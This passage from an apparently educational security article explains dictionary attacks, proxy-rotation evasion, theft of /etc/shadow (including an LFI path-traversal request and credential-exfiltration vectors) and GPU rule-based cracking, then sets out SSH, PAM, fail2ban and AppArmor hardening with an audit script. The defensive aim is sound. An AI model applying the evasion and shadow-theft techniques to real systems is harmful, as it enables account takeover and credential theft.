Modern network defenders deploy Web Application Firewalls (WAFs) and Host Intrusion Prevention Systems (like Fail2ban) that monitor IP addresses and drop connections exceeding a threshold.

To maintain persistent attack velocity, automated dictionary engines employ sophisticated evasion techniques:

```
+---------------------------------------------------------------------------------------------------+
|                            EVASION & PROXY ROTATION PIPELINE                                      |
|                                                                                                   |
|  [ DICTIONARY ATTACK ENGINE ]                                                                     |
|  - Manages Wordlist Queue (rockyou.txt)                                                           |
|  - Tracks State, Responses, and Successful Hits                                                   |
|                                |                                                                  |
|                                v                                                                  |
|  [ ROTATING RESIDENTIAL PROXY POOL / SERVERLESS EGRESS ]                                          |
|  +---------------------------------------------------------------------------------------------+  |
|  | Node 1 (IP: 185.220.101.5)  | Node 2 (IP: 92.40.12.188)   | Node 3 (IP: 104.28.19.4)        |  |
|  | Residential DSL - Germany  | 4G Mobile - UK              | Cloud Function - AWS US-East    |  |
|  +---------------------------------------------------------------------------------------------+  |
|               |                                |                             |                    |
|               v                                v                             v                    |
|  [ TARGET AUTHENTICATION ENDPOINT ]                                                               |
|  - Receives 1 attempt per IP address every 15 minutes.                                            |
|  - Fail2ban sees isolated, unrelated connection attempts.                                         |
|  - Result: IP-based rate limiters are completely blinded.                                         |
+---------------------------------------------------------------------------------------------------+
```

1. **Residential Proxy Networks**:
   Adversaries route requests through commercial proxy providers (or compromised IoT botnets) that route traffic through millions of real residential ISP connections. Because every authentication probe originates from a distinct IP address and autonomous system number (ASN), traditional IP-based rate limiting (such as banning an IP after 5 failed attempts) is neutralized.

2. **Serverless Cloud Function Spraying**:
   By deploying micro-probing scripts across AWS Lambda, Google Cloud Run, or Azure Functions, an attacker can generate tens of thousands of requests where each invocation executes from a completely different ephemeral cloud IP.

3. **Low-and-Slow (Jittered) Scheduling**:
   Instead of blasting 100 requests per second, sophisticated sprayers introduce randomized micro-delays (jitter):
   $$T_{\text{delay}} = \mu + \mathcal{N}(0, \sigma^2)$$
   A probe is executed once every 12 to 45 minutes per account. The traffic blends seamlessly into background operational noise, avoiding statistical anomaly detection algorithms.

---

## 5. Offline Password Cracking: Post-Compromise Physics

Online attacks are constrained by the physical limits of the network: bandwidth, socket creation latency, and server-side response times. 

The moment an adversary achieves a read-primitive on the server—via Local File Inclusion (LFI), an unauthenticated database backup exposure (`db_backup.sql`), an insecure S3 bucket, or a local privilege escalation bug—they exfiltrate the hashed password file:

```bash
/etc/shadow
```

The attack instantly transitions from **Online Probing** to **Offline Cracking**.

```
+---------------------------------------------------------------------------------------------------+
|                        ONLINE ATTACK vs. OFFLINE CRACKING COMPARISON                              |
|                                                                                                   |
|   CHARACTERISTIC                 ONLINE ATTACKS                  OFFLINE CRACKING                 |
|   ---------------------------------------------------------------------------------------------   |
|   Execution Location             Target Remote Server            Attacker GPU Cluster             |
|   Network Latency (RTT)          50 ms - 200 ms per try          0.00 ms (In-Memory / VRAM)       |
|   Rate Limiting & Lockouts       Enforced by OS / App / WAF      NON-EXISTENT                     |
|   Defensive Visibility           Auditd, Syslog, Auth.log        ZERO TELEMETRY ON VICTIM HOST    |
|   Throughput Ceiling             5 to 50 attempts / sec          1,000,000 to 200,000,000,000 / s |
|   Attacker Risk of Detection     High                            ZERO                             |
+---------------------------------------------------------------------------------------------------+
```

In the offline domain, **all defender-side safeguards evaporate**. There are no accounts to lock, no firewall rules to trigger, no CAPTCHAs to solve, and no logs written to the victim machine. The attacker is limited solely by **computational silicon, electricity, and the mathematical properties of the hashing algorithm**.

---

### 5.1 Dissecting `/etc/shadow`

On modern Linux systems, user authentication data is segregated from the world-readable `/etc/passwd` file and stored in `/etc/shadow`, accessible strictly by the `root` user or members of the `shadow` system group (`permissions 0640` or `0600`).

A standard Linux shadow entry comprises nine colon-delimited fields:

```text
guigo:$6$qZ8xK9mP$vN4R2...[86 chars]...z8:19842:0:99999:7:::
```

```
+---------------------------------------------------------------------------------------------------+
|                             ANATOMY OF AN /ETC/SHADOW RECORD                                      |
|                                                                                                   |
|   guigo : $6$ : qZ8xK9mP : vN4R2...z8 : 19842 : 0 : 99999 : 7 : : :                              |
|     |      |       |             |        |     |     |     |                                     |
|     |      |       |             |        |     |     |     +-> Warning days before pass expires  |
|     |      |       |             |        |     |     +-------> Maximum password validity (days)  |
|     |      |       |             |        |     +-------------> Minimum password age (days)       |
|     |      |       |             |        +-------------------> Days since Jan 1, 1970 of change  |
|     |      |       |             +----------------------------> Computed Cryptographic Hash      |
|     |      |       +------------------------------------------> Salt (Cryptographic Nonce)        |
|     |      +--------------------------------------------------> Algorithm Identifier ($6$ = SHA512)
|     +---------------------------------------------------------> Target Username                   |
+---------------------------------------------------------------------------------------------------+
```

#### Cryptographic Identifiers in `/etc/shadow`
The characters between the first and second `$` determine the cryptographic algorithm used by Linux PAM (`crypt(3)`):

| ID | Algorithm | Status | Architectural Vulnerability |
| :--- | :--- | :--- | :--- |
| **`$1$`** | **MD5** (Crypt-MD5) | Obsolete / Catastrophic | Extremely fast on GPUs; zero memory hardness; trivial to crack. |
| **`$2a$` / `$2b$`** | **bcrypt** | Strong | CPU/ALU bound; configurable work factor ($2^N$ cost iterations). |
| **`$5$`** | **SHA-256** (Crypt-SHA256) | Legacy | Fast on GPUs; no memory resistance; 5,000 default rounds. |
| **`$6$`** | **SHA-512** (Crypt-SHA512) | Standard Default (Ubuntu 18.04-20.04) | 5,000 default rounds; GPU accelerated easily by modern compute. |
| **`$y$`** | **yescrypt** | **Current Modern Standard (Ubuntu 22.04+)** | **Memory-hard** key derivation function; highly resistant to GPU/ASIC parallelism. |

#### The Purpose and Limits of the Salt
The salt (e.g., `qZ8xK9mP`) is a randomly generated alphanumeric string appended to the password prior to hashing:

$$\text{Hash} = H(\text{Password} \parallel \text{Salt})$$

* **What Salt Protects Against**: Rainbow tables (precomputed hash lookup tables) and multi-target attacks. If ten users share the password `Password123!`, each will have a unique salt, resulting in ten completely distinct cryptographic hashes in `/etc/shadow`.
* **What Salt DOES NOT Protect Against**: **Dictionary attacks and brute-force**. The salt is stored in cleartext alongside the hash. When the attacker loads the shadow entry into an offline cracking tool, the tool reads the salt directly and hashes every candidate word with that exact salt during verification.

#### Post-Compromise Exfiltration Vectors: How Adversaries Steal `/etc/shadow`

Because `/etc/shadow` is protected by `0640` or `0600` permissions, an unprivileged user cannot simply run `cat /etc/shadow`. How do attackers extract these hashes off the server in practice?

```
+---------------------------------------------------------------------------------------------------+
|                         SHADOW HASH EXFILTRATION VECTORS IN ENTERPRISES                           |
|                                                                                                   |
|  [ VECTOR 1: WEB APP LFI WITH ROOT WORKERS ]                                                      |
|  Attacker ----> GET /download?file=../../../../etc/shadow ----> App runs as root/daemon           |
|                 (Returns raw hashed entries via HTTP response)                                    |
|                                                                                                   |
|  [ VECTOR 2: STALE & WORLD-READABLE BACKUP ARTIFACTS ]                                            |
|  Cron script: tar -czf /var/backups/system_backup.tar.gz /etc                                      |
|  Attacker unprivileged shell: finds world-readable .tar.gz or /etc/shadow- with loose ACLs        |
|                                                                                                   |
|  [ VECTOR 3: CONTAINER VOLUME MOUNT OVERREACH ]                                                   |
|  Developer mounts host root: docker run -v /:/host_root ubuntu                                    |
|  Attacker breaches container ----> Reads /host_root/etc/shadow directly                           |
|                                                                                                   |
|  [ VECTOR 4: PROCESS MEMORY HARVESTING ]                                                          |
|  GDB / /proc/$PID/mem scraping: Dumps plaintext passwords from authentication daemon memory       |
+---------------------------------------------------------------------------------------------------+
```

1. **Local File Inclusion (LFI) via Privileged Web Daemons**:
   If an internal dashboard, reporting microservice, or legacy PHP application runs with elevated permissions (e.g., misconfigured Apache with `mod_ruid2`, an unprivileged developer script executed via `sudo`, or a Go binary binding port 80 directly as root), an arbitrary file read vulnerability allows an attacker to download `/etc/shadow` directly over HTTP.

2. **World-Readable Backup Files (`shadow.bak` and `/etc/shadow-`)**:
   Standard Linux user management tools (`usermod`, `useradd`, `passwd`) automatically create a backup file: `/etc/shadow-`. If an administrator archives `/etc` into `/tmp/backup.tar.gz` or `/var/backups/` and fails to preserve strict `0600` umasks, unprivileged local users or compromised service accounts (`www-data`, `nobody`) can read the archive without needing `root`.

3. **Container Volume Mount Overreach**:
   In modern Kubernetes and Docker environments, utility pods and monitoring daemonsets frequently mount the host root filesystem:
   ```yaml
   volumeMounts:
   - mountPath: /host
     name: host-root
   ```
   If an adversary gains a remote shell inside a container pod with this mount, they simply read `/host/etc/shadow`, exfiltrate the hashes via DNS tunneling or curl, and proceed to crack host administrator passwords offline.

---

### 5.2 GPU Architecture: The Physics of High-Throughput Hash Cracking

Why do attackers crack hashes on GPUs rather than high-end server CPUs?

The answer lies in the hardware architecture of central processing units vs. graphics processing units:

```
+---------------------------------------------------------------------------------------------------+
|                              CPU vs. GPU SILICON ARCHITECTURE                                     |
|                                                                                                   |
|   CENTRAL PROCESSING UNIT (CPU)                   GRAPHICS PROCESSING UNIT (GPU)                  |
|   "Low Latency, Complex Instruction Flow"         "Massive Parallelism, High Throughput SIMD"     |
|                                                                                                   |
|   +---------------------------------------+       +-------------------------------------------+   |
|   |  Large L1/L2/L3 Caches                |       |  Thousands of Tiny Arithmetic Logic Units |   |
|   |  Branch Predictor & Out-of-Order Core |       |  (ALUs / CUDA Cores / Stream Processors)  |   |
|   |  Low Core Count (8 to 64 cores)       |       |  16,384+ Execution Cores per RTX 4090     |   |
|   +---------------------------------------+       +-------------------------------------------+   |
|                                                                                                   |
|   Executes 64 complex threads sequentially.       Executes 16,384 identical hashing algorithms   |
|   Excellent for operating system kernels.         simultaneously in parallel (SIMD).             |
+---------------------------------------------------------------------------------------------------+
```

Cryptographic hashing algorithms like MD5, NTLM, and SHA-256 are purely mathematical: bitwise operations (AND, OR, XOR, NOT), bit shifts, and 32-bit/64-bit integer additions. They require no branch prediction, no disk I/O, and minimal memory caching.

A modern enterprise GPU cracking rig equipped with **8x NVIDIA GeForce RTX 4090** graphics cards delivers raw compute power that renders fast hashing algorithms completely transparent:

| Hashing Algorithm | Linux Shadow ID | Single CPU (Intel i9 14900K) | 8x NVIDIA RTX 4090 GPU Rig | Time to Exhaust `rockyou.txt` (14.3M words) |
| :--- | :--- | :--- | :--- | :--- |
| **NTLM / MD4** | Windows SAM | ~1.2 GH/s | **> 1,600,000,000,000 h/s (1.6 TH/s)** | **< 0.00001 seconds** |
| **MD5 (Crypt `$1$`)** | Linux Legacy | ~85 MH/s | **> 180,000,000,000 h/s (180 GH/s)** | **< 0.0001 seconds** |
| **SHA-256 (Crypt `$5$`)** | Linux Legacy | ~120 KH/s | **> 450,000,000 h/s (450 MH/s)** | **~ 0.03 seconds** |
| **SHA-512 (Crypt `$6$`)** | Linux Standard | ~45 KH/s | **> 180,000,000 h/s (180 MH/s)** | **~ 0.08 seconds** |
| **bcrypt ($2^{10}$ cost)** | Modern Web | ~1.8 KH/s | **~ 850,000 h/s (850 KH/s)** | **~ 16.8 seconds** |
| **yescrypt / Argon2id** | Modern Linux | ~250 h/s | **~ 25,000 h/s (Memory Hard)** | **~ 9.5 minutes** |

Notice the staggering drop in throughput when moving from **fast hashes** (MD5/SHA) to **memory-hard hashes** (bcrypt/yescrypt/Argon2). Fast hashes rely exclusively on registers and ALUs; memory-hard hashes force the processor to allocate megabytes of high-bandwidth memory per thread, saturating the GPU's memory bus and throttling parallelism by orders of magnitude.

---

### 5.3 The Engine of Mutation: Rule-Based Cracking

What happens when a target user has chosen `Dragonfly2024!`—a password that does not appear verbatim in `rockyou.txt`?

A novice attacker assumes the wordlist fails. An experienced adversary knows that `rockyou.txt` is not an endpoint; it is **fuel for a mutation rule engine**.

```
+---------------------------------------------------------------------------------------------------+
|                                  THE RULE MUTATION PIPELINE                                       |
|                                                                                                   |
|   BASE WORDLIST ENTRY                  MUTATION RULES ENGINE               CANDIDATE PASSWORDS    |
|                                                                                                   |
|                                        [ Rule: Capitalize ]                Dragonfly              |
|                                                |                                                  |
|                                                v                                                  |
|                                        [ Rule: Append Year ] ------------> Dragonfly2024          |
|   "dragonfly"                                  |                                                  |
|   (from rockyou.txt)                           v                                                  |
|                                        [ Rule: Append Symbol ] -----------> Dragonfly2024!        |
|                                                |                                                  |
|                                                v                                                  |
|                                        [ Rule: Leet Speak (o->0) ] -------> Drag0nfly2024!        |
+---------------------------------------------------------------------------------------------------+
```

Cracking engines like Hashcat and John the Ripper implement specialized rule-based languages. A rule transforms a base candidate string on the fly directly inside GPU VRAM before hashing.

#### Common Mutation Primitives:
* **Prefix / Suffix Rules**:
  * `$!` $\to$ Appends `!` to the end of the word.
  * `^1` $\to$ Prepends `1` to the start of the word.
  * `$2 $0 $2 $4` $\to$ Appends the current year (`2024`).
* **Case Manipulation**:
  * `c` $\to$ Capitalize the first letter, lowercase the rest (`dragonfly` $\to$ `Dragonfly`).
  * `u` $\to$ Uppercase all characters (`DRAGONFLY`).
  * `t` $\to$ Toggle case across the word.
* **Leet-Speak Replacements**:
  * `so0` $\to$ Substitute all occurrences of `o` with `0`.
  * `se3` $\to$ Substitute all occurrences of `e` with `3`.
  * `sa@` $\to$ Substitute all occurrences of `a` with `@`.
* **Combinator / Mask Operations**:
  * Combining two entire wordlists together (e.g., `word1` + `word2`).
  * Appending brute-forced masks (e.g., `?d?d?d?s` = three digits followed by a symbol).

**The Combinatorial Multiplier**:
A base dictionary of **14,344,392 words** running through a modest rule set of **500 mutation rules** produces:

$$14,344,392 \times 500 = 7,172,196,000 \text{ unique candidate passwords}$$

On an 8x RTX 4090 GPU cluster cracking Linux SHA-512 (`$6$`), evaluating all 7.17 billion rule-mutated variations takes **less than 40 seconds**.

---

## 6. The Defensive Blueprint: Neutralizing the Wordlist Weapon

To defeat automated dictionary attacks, defenders must architect controls across every layer of the infrastructure stack: **Perimeter Isolation**, **Cryptographic Key Enclave**, **Intrusion Throttling**, and **Password Storage Hardening**.

```
+---------------------------------------------------------------------------------------------------+
|                            THE ZERO-TRUST AUTHENTICATION BLUEPRINT                                |
|                                                                                                   |
|  [ LAYER 1: NETWORK DEFENSE ]                                                                     |
|  - Default Deny Firewall (nftables / UFW)                                                         |
|  - Management Ports (22, 3306, 5432) hidden behind WireGuard / Tailscale Overlay VPN             |
|  - No direct public internet listening sockets for infrastructure administration                  |
|                                                                                                   |
|  [ LAYER 2: AUTHENTICATION ELIMINATION ]                                                          |
|  - sshd_config: PasswordAuthentication no & KbdInteractiveAuthentication no                       |
|  - Enforce FIDO2 WebAuthn Hardware Keys (ed25519-sk) or Short-Lived SSH Certificates              |
|  - Passwords completely eliminated from the remote attack surface                                 |
|                                                                                                   |
|  [ LAYER 3: INTRUSION DETECTION & ACTIVE DROPPING ]                                               |
|  - Kernel-level IP dropping via nftables / ipset sets                                             |
|  - Collaborative threat intelligence via CrowdSec (Banning known scanning botnets preemptively)   |
|  - Linux PAM lockout policies via pam_faillock                                                    |
|                                                                                                   |
|  [ LAYER 4: CRYPTOGRAPHIC VAULT HARDENING ]                                                       |
|  - Linux shadow hashing upgraded to memory-hard 'yescrypt' or 'Argon2id'                          |
|  - Strict filesystem permissions (0600 root:root) on /etc/shadow                                  |
|  - AppArmor / SELinux mandatory access controls restricting web daemons from reading /etc         |
+---------------------------------------------------------------------------------------------------+
```

---

### Step 1: Complete Elimination of Password Authentication for SSH

The single most effective action in Linux systems engineering is completely eradicating password-based authentication from remote listening daemons. If the daemon rejects passwords entirely, **the wordlist is rendered 100% inert**.

Edit `/etc/ssh/sshd_config` (or better, place a drop-in file in `/etc/ssh/sshd_config.d/99-hardened.conf`):

```ini
# Enforce modern Public Key Authentication exclusively
PasswordAuthentication no
KbdInteractiveAuthentication no
AuthenticationMethods publickey

# Disable root login over SSH
PermitRootLogin prohibit-password

# Restrict maximum authentication attempts per connection
MaxAuthTries 3

# Drop idle unauthenticated connections rapidly
LoginGraceTime 20
```

Verify syntax and reload the systemd service:

```bash
sudo sshd -t && sudo systemctl reload ssh
```

> **Engineering Note**: Ensure you have loaded and tested an Ed25519 SSH key (`ssh-ed25519`) in `~/.ssh/authorized_keys` before reloading `sshd` to prevent accidental lockout.

---

### Step 2: Advanced Host Intrusion Prevention with Fail2ban & nftables

For services that *must* accept passwords (such as web portals or customer-facing mail daemons), implement dynamic rate limiting that drops malicious traffic at the kernel packet-filter layer rather than the userspace application layer.

Configure `/etc/fail2ban/jail.local`:

```ini
[DEFAULT]
# Ban hosts for 1 hour after 5 failures within a 10-minute window
bantime  = 1h
findtime = 10m
maxretry = 5

# Use modern nftables for high-performance packet dropping
banaction = nftables-multiport
banaction_allports = nftables-allports

[sshd]
enabled = true
port    = 22
mode    = aggressive
logpath = %(sshd_log)s
backend = systemd
```

When an attacker attempts to probe passwords, `fail2ban` dynamically inserts the attacking IP into an `nftables` kernel set. Subsequent packets are dropped immediately in the kernel network stack before `sshd` ever allocates memory or executes an authentication fork.

---

### Step 3: Upgrade System Password Hashing to Memory-Hard `yescrypt`

If an attacker achieves a post-compromise read of `/etc/shadow`, the difficulty of cracking the hashes is governed entirely by the algorithm configured in Linux PAM.

Inspect your system's current hashing algorithm in `/etc/pam.d/common-password`:

```bash
grep -E "pam_unix.so.*(sha512|yescrypt)" /etc/pam.d/common-password
```

If your installation uses legacy SHA-512 (`$6$`), upgrade to **yescrypt** (supported on Ubuntu 22.04 LTS and modern Linux kernels). Yescrypt requires multi-megabyte memory allocations per hash calculation, neutralizing GPU acceleration.

Update `/etc/pam.d/common-password`:

```text
password   [success=1 default=ignore]  pam_unix.so obscure yescrypt cost=5
```

---

### Step 4: Defense Against Web Application Dictionary Attacks

For web services and APIs:

1. **Disable XML-RPC on WordPress**:
   If XML-RPC is not required for mobile client publishing, block it completely at the reverse proxy layer (Nginx):
   ```nginx
   location = /xmlrpc.php {
       deny all;
       access_log off;
       log_not_found off;
       return 403;
   }
   ```

2. **Deploy Cloudflare Turnstile or WAF Managed Challenges**:
   Enforce non-interactive cryptographic proof-of-work challenges on `/login` and `/api/v1/auth` endpoints. Autonomous botnets executing automated HTTP POST requests will fail the challenge before hitting backend application servers.

3. **Implement Application-Level Rate Limiting**:
   In Nginx, configure rate-limiting zones bound to client IP addresses:
   ```nginx
   limit_req_zone $binary_remote_addr zone=auth_limit:10m rate=5r/m;

   location /api/v1/auth/ {
       limit_req zone=auth_limit burst=3 nodelay;
       proxy_pass http://backend_upstream;
   }
   ```

4. **Enforce Mandatory Multi-Factor Authentication (MFA)**:
   Deploy TOTP (Time-Based One-Time Password) or FIDO2/WebAuthn. Even if an adversary extracts a valid password from a breached combo list via credential stuffing, authentication fails at the second factor.

---

### Step 5: Enforce System-Wide Account Lockout with `pam_faillock`

For local console, sudo, and physical TTY logins where passwords must be supported, prevent automated vertical brute-force by configuring Linux PAM's modern failure lockout module: `pam_faillock`.

Configure `/etc/security/faillock.conf`:

```ini
# Lock account after 5 failed authentication attempts
deny = 5

# Track failures within a 15-minute sliding window (900 seconds)
fail_interval = 900

# Lock the account for 30 minutes (1800 seconds)
unlock_time = 1800

# Apply lockouts to the root user as well (prevents root console brute-force)
even_deny_root

# Root lockout duration (15 minutes)
root_unlock_time = 900
```

Verify active lockouts and clear accidental locks using `faillock`:

```bash
# View current failed authentication attempts across all accounts
sudo faillock

# Reset lock state for a specific user
sudo faillock --user <username> --reset
```

---

### Step 6: Hardening Filesystem Permissions & AppArmor Confinement for `/etc/shadow`

To guarantee that post-compromise LFI or unprivileged application exploits cannot exfiltrate `/etc/shadow`, enforce strict filesystem boundaries and Mandatory Access Control (MAC) profiles:

1. **Enforce Impeccable Permissions**:
   ```bash
   sudo chown root:shadow /etc/shadow /etc/shadow-
   sudo chmod 0640 /etc/shadow /etc/shadow-
   ```

2. **Purge World-Readable Backup Archives**:
   Search and remove any world-readable archives or unprivileged copies of `/etc`:
   ```bash
   sudo find / -maxdepth 3 -name "*shadow*" -o -name "*backup*" 2>/dev/null | grep -v "/proc"
   ```

3. **AppArmor Profile Confinement for Web Workers**:
   Ensure your web server (Nginx/Apache) and application workers (PHP-FPM, Node.js) cannot read `/etc/shadow` under any circumstances. In `/etc/apparmor.d/usr.sbin.nginx`:
   ```text
   # Explicitly deny access to shadow and sensitive credentials
   deny /etc/shadow* rwx,
   deny /etc/gshadow* rwx,
   deny /var/backups/** rwx,
   ```
   Reload AppArmor:
   ```bash
   sudo apparmor_parser -r /etc/apparmor.d/usr.sbin.nginx
   ```

---

## 7. The Architecture Comparison Matrix

To summarize the operational dynamics of automated dictionary attacks and their defenses:

| Vector / Scenario | Attack Execution Mechanism | Attacker Speed / Throughput | Primary Defensive Countermeasure | Failure Mode If Undefended |
| :--- | :--- | :--- | :--- | :--- |
| **SSH (Port 22)** | Asynchronous TCP worker pool iterating `rockyou.txt` | 5 to 50 attempts/sec per IP | Disable passwords; enforce `Ed25519` keys + WireGuard | Instant remote root/user shell compromise |
| **Web XML-RPC** | Batch `system.multicall` HTTP POST payloads | Up to 1,000 attempts per HTTP request | Block `/xmlrpc.php` in Nginx / Caddy | CMS administrator takeover |
| **Database (MySQL)** | Direct TCP handshake brute-force on port 3306 | 20 to 100 attempts/sec | Bind to `127.0.0.1`; block WAN ingress | Total database exfiltration & drop |
| **Password Spraying** | 1 password tested against thousands of corporate users | 1 attempt per user per hour | Enforce MFA; deploy behavioral SIEM analytics | Undetected lateral enterprise beachhead |
| **Credential Stuffing** | Replaying external breach combo-lists via rotating proxies | 1,000+ requests/sec across distributed IPs | WAF bot detection + WebAuthn/TOTP | High-volume account takeovers (ATO) |
| **Offline Shadow Cracking** | 8x RTX 4090 GPU rigs executing rule mutations | Up to **180 Billion hashes/sec** (MD5/SHA) | Restrict `/etc/shadow` (0640); migrate to `yescrypt` | Complete offline plaintext credential recovery |

---

## 8. Automated Defense Verification: The Bash Audit Engine

To verify that your Linux hosts have completely eradicated password attack surfaces, deploy this production audit script: `verify-auth-hardening.sh`. 

This non-destructive script inspects running OpenSSH configurations, Linux PAM hashing modules, `/etc/shadow` permissions, active network listening sockets, and intrusion prevention daemons:

```bash
#!/usr/bin/env bash
# ==============================================================================
# verify-auth-hardening.sh
# Production Linux Authentication & Wordlist Attack Surface Audit
# ==============================================================================
set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

pass_count=0
fail_count=0
warn_count=0

log_check() { echo -e "\n${BLUE}[CHECK]${NC} $1"; }
log_pass()  { echo -e "  ${GREEN}[PASS]${NC} $1"; ((pass_count++)); }
log_fail()  { echo -e "  ${RED}[FAIL]${NC} $1"; ((fail_count++)); }
log_warn()  { echo -e "  ${YELLOW}[WARN]${NC} $1"; ((warn_count++)); }

echo "================================================================="
echo "   Linux Authentication & Endpoint Hardening Audit"
echo "================================================================="

# 1. Check SSH Password Authentication
log_check "1. OpenSSH PasswordAuthentication Directive"
if sshd -T 2>/dev/null | grep -iq "passwordauthentication no"; then
    log_pass "SSH password authentication is explicitly DISABLED."
else
    log_fail "SSH password authentication is ENABLED! Server is vulnerable to online brute-force."
fi

# 2. Check SSH Root Login
log_check "2. OpenSSH PermitRootLogin Directive"
root_login=$(sshd -T 2>/dev/null | grep -i "permitrootlogin" | awk '{print $2}')
if [[ "$root_login" == "no" || "$root_login" == "prohibit-password" ]]; then
    log_pass "SSH root password login is disabled (PermitRootLogin: $root_login)."
else
    log_fail "SSH permits direct root login (PermitRootLogin: $root_login)!"
fi

# 3. Check SSH MaxAuthTries
log_check "3. OpenSSH MaxAuthTries Rate Limiting"
max_tries=$(sshd -T 2>/dev/null | grep -i "maxauthtries" | awk '{print $2}')
if [[ "$max_tries" -le 4 ]]; then
    log_pass "SSH MaxAuthTries is hardened ($max_tries attempts max)."
else
    log_warn "SSH MaxAuthTries is high ($max_tries attempts). Recommend setting <= 4."
fi

# 4. Check /etc/shadow Permissions & Ownership
log_check "4. /etc/shadow File Security"
shadow_perms=$(stat -c "%a" /etc/shadow)
shadow_owner=$(stat -c "%U:%G" /etc/shadow)
if [[ "$shadow_perms" == "640" || "$shadow_perms" == "600" ]] && [[ "$shadow_owner" == "root:shadow" || "$shadow_owner" == "root:root" ]]; then
    log_pass "/etc/shadow permissions are secure ($shadow_perms $shadow_owner)."
else
    log_fail "/etc/shadow has insecure permissions ($shadow_perms $shadow_owner)! Must be 0640 or 0600."
fi

# 5. Check Active Password Hashing Algorithms in /etc/shadow
log_check "5. Cryptographic Hashing Algorithms in /etc/shadow"
if grep -q -E '^\w+:\$1\$' /etc/shadow; then
    log_fail "Found legacy MD5 (\$1\$) hashes in /etc/shadow! Trivial GPU cracking vulnerability."
elif grep -q -E '^\w+:\$5\$' /etc/shadow; then
    log_warn "Found legacy SHA-256 (\$5\$) hashes in /etc/shadow. Upgrade to yescrypt."
elif grep -q -E '^\w+:\$y\$' /etc/shadow; then
    log_pass "Modern memory-hard yescrypt (\$y\$) hashes active in /etc/shadow."
elif grep -q -E '^\w+:\$6\$' /etc/shadow; then
    log_pass "Standard SHA-512 (\$6\$) hashes active in /etc/shadow."
else
    log_pass "No active password hashes detected (All accounts locked or key-based)."
fi

# 6. Check PAM Password Hashing Configuration
log_check "6. Linux PAM common-password Hashing Module"
if grep -q -E "pam_unix.so.*yescrypt" /etc/pam.d/common-password 2>/dev/null; then
    log_pass "PAM enforces modern memory-hard yescrypt algorithm for new passwords."
elif grep -q -E "pam_unix.so.*sha512" /etc/pam.d/common-password 2>/dev/null; then
    log_pass "PAM enforces SHA-512 algorithm for new passwords."
else
    log_warn "PAM does not explicitly enforce yescrypt or SHA-512 in common-password!"
fi

# 7. Check Insecure WAN Listening Sockets
log_check "7. Wildcard Database & Management Sockets (0.0.0.0 / :::)"
insecure_ports=0
for port in 21 3306 5432 6379 27017; do
    if ss -tulpn | grep -E "LISTEN.*(0\.0\.0\.0|:::):$port\b" >/dev/null; then
        log_fail "Port $port is publicly exposed on wildcard interface! Vulnerable to direct dictionary attacks."
        ((insecure_ports++))
    fi
done
if [[ "$insecure_ports" -eq 0 ]]; then
    log_pass "No database or legacy management ports exposed on public wildcard interfaces."
fi

# 8. Check Active Intrusion Prevention (Fail2ban / CrowdSec)
log_check "8. Host Intrusion Prevention System (HIPS)"
if systemctl is-active --quiet fail2ban; then
    log_pass "Fail2ban daemon is active."
    jail_count=$(fail2ban-client status 2>/dev/null | grep -i "Jail list" | awk -F: '{print $2}' | tr -d ' \t')
    echo -e "       Active Jails: ${jail_count:-None}"
elif systemctl is-active --quiet crowdsec; then
    log_pass "CrowdSec collaborative intrusion prevention daemon is active."
else
    log_warn "Neither Fail2ban nor CrowdSec is actively running! Rate limiting depends solely on firewalls."
fi

# 9. Check pam_faillock Lockout Module
log_check "9. PAM Account Lockout Policy (pam_faillock)"
if grep -q -E "pam_faillock.so" /etc/pam.d/common-auth 2>/dev/null || [[ -f /etc/security/faillock.conf ]]; then
    log_pass "pam_faillock account lockout policy is configured."
else
    log_warn "pam_faillock is not configured; local console accounts lack automatic lockout thresholds."
fi

# 10. Check WordPress XML-RPC Exposure (If Web Server Present)
log_check "10. Web Server XML-RPC Protection"
if command -v curl >/dev/null 2>&1; then
    xml_status=$(curl -s -o /dev/null -w "%{http_code}" http://localhost/xmlrpc.php || echo "000")
    if [[ "$xml_status" == "403" || "$xml_status" == "404" ]]; then
        log_pass "Local XML-RPC endpoint is blocked or non-existent (HTTP $xml_status)."
    elif [[ "$xml_status" == "200" || "$xml_status" == "405" ]]; then
        log_warn "Local /xmlrpc.php responded with HTTP $xml_status! Verify batch multicall protection."
    else
        log_pass "No local web server responding on port 80 (HTTP $xml_status)."
    fi
fi

echo -e "\n================================================================="
echo -e "   Audit Summary: ${GREEN}$pass_count PASSED${NC} | ${RED}$fail_count FAILED${NC} | ${YELLOW}$warn_count WARNINGS${NC}"
echo "================================================================="
```

---

## 9. The 20-Point Production Authentication Hardening Checklist

Use this checklist during infrastructure provisioning and quarterly compliance reviews to ensure your perimeter is impervious to automated credential warfare:

### Network Perimeter & Port Isolation
- [ ] **1. Default-Deny Ingress Enforced**: Firewall drops all unsolicited inbound packets by default via `nftables` or UFW.
- [ ] **2. Remote Admin Behind Overlay VPN**: Port 22 removed from the public WAN; accessible exclusively via WireGuard, Tailscale, or an internal bastion.
- [ ] **3. Auxiliary Daemons Isolated**: MySQL (3306), Postgres (5432), and Redis (6379) bound strictly to `127.0.0.1` or internal Docker networks.
- [ ] **4. Legacy Protocols Purged**: FTP (21), Telnet (23), and unencrypted HTTP admin portals completely removed.

### SSH & Remote Access Hardening
- [ ] **5. Passwords Fully Disabled**: `PasswordAuthentication no` and `KbdInteractiveAuthentication no` enforced in `/etc/ssh/sshd_config`.
- [ ] **6. Root Direct Login Prohibited**: `PermitRootLogin prohibit-password` or `no` enforced.
- [ ] **7. Modern Key Cryptography**: All authorized keys use `ed25519` or `ed25519-sk` (FIDO2); legacy RSA < 3072 bits purged.
- [ ] **8. Aggressive Connection Throttling**: `MaxAuthTries 3` and `LoginGraceTime 20` set to drop automated connection workers rapidly.

### Linux PAM & Cryptographic Storage Hardening
- [ ] **9. Strict Shadow Permissions**: `/etc/shadow` and `/etc/shadow-` set strictly to `0640` or `0600` owned by `root:shadow`.
- [ ] **10. Memory-Hard Hashing Deployed**: PAM configured to use `yescrypt` or `Argon2id` in `/etc/pam.d/common-password`.
- [ ] **11. Legacy Hashes Purged**: Zero MD5 (`$1$`) or DES hashes exist in `/etc/shadow`.
- [ ] **12. Account Lockout Active**: `pam_faillock` configured in `/etc/security/faillock.conf` (`deny = 5`, `unlock_time = 1800`).

### Web Applications & API Gateways
- [ ] **13. WordPress XML-RPC Blocked**: Direct requests to `/xmlrpc.php` rejected with `HTTP 403 Forbidden` at Nginx/Apache.
- [ ] **14. Non-Interactive Proof-of-Work**: Cloudflare Turnstile or reCAPTCHA v3 active on all public login endpoints.
